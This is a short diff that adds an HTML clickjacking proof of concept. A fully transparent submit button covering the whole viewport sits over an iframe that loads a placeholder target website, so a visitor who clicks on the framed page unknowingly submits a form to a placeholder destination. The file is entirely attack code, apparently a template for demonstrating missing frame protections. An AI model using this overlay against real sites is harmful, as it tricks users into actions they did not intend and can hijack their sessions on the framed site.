@@ -1,0 +1,7 @@
+<html>
+	<body>
+		<form action="<dummy website link like https://www.example.com>">
+			<input type="submit" value="abc" style="width:1830px;height:775px;position:fixed;opacity:0.0;"></form>
+				<iframe src="<target website>" width="1430" height="775"></iframe>
+			</body>
+</html>
